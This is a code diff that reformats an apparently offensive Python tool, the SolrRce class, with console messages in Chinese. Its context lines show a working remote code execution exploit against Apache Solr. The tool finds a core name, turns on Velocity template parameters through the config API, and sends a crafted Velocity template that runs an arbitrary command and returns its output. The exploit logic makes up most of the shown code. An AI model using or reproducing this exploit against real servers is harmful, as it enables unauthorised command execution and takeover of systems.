@@ -15,7 +15,8 @@ class SolrRce:
     def get_core_name(self):
         cort_name_url = self.url + "/solr/admin/cores?wt=json&indexInfo=false"
         header = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
+            "User-Agent":
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
         }
         try:
             response = requests.get(cort_name_url, headers=header, timeout=1)
@@ -31,14 +32,17 @@ class SolrRce:
             return core_name[0]
 
         else:
-            cprint('[-] 未找到core_name, 请检查solr admin配置 ',  'yellow', 'on_red')
+            cprint('[-] 未找到core_name, 请检查solr admin配置 ', 'yellow', 'on_red')
             sys.exit(0)
 
     def enable_cort_params(self):
         header = {
-            "Content-Type": "application/json",
-            "Content-Length": "259",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
+            "Content-Type":
+            "application/json",
+            "Content-Length":
+            "259",
+            "User-Agent":
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
         }
         body = {
             "update-queryresponsewriter": {
@@ -51,7 +55,9 @@ class SolrRce:
             }
         }
         params_enable_url = self.url + "/solr/" + self.core_name + "/config"
-        response = requests.post(url=params_enable_url, json=body, headers=header)
+        response = requests.post(url=params_enable_url,
+                                 json=body,
+                                 headers=header)
 
         if response.json()["responseHeader"]["status"] == 0:
             return True
@@ -60,7 +66,7 @@ class SolrRce:
 
     def exp(self):
         if self.available is False:
-            cprint('[*] URL: %s 注入失败' % self.url,  'yellow', 'on_red')
+            cprint('[*] URL: %s 注入失败' % self.url, 'yellow', 'on_red')
             sys.exit(0)
 
         else:
@@ -73,10 +79,11 @@ class SolrRce:
             exp_code3 = "')) $ex.waitFor() #set($out=$ex.getInputStream()) " \
                         "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
 
-            end_url = self.url + "/solr/" + self.core_name + exp_code1 + quote(exp_code2 + self.command +
-                                                                               exp_code3, 'utf-8')
+            end_url = self.url + "/solr/" + self.core_name + exp_code1 + quote(
+                exp_code2 + self.command + exp_code3, 'utf-8')
             header = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
+                "User-Agent":
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
             }
             cmd_result = requests.get(end_url, headers=header)
             if cmd_result.status_code == 500:
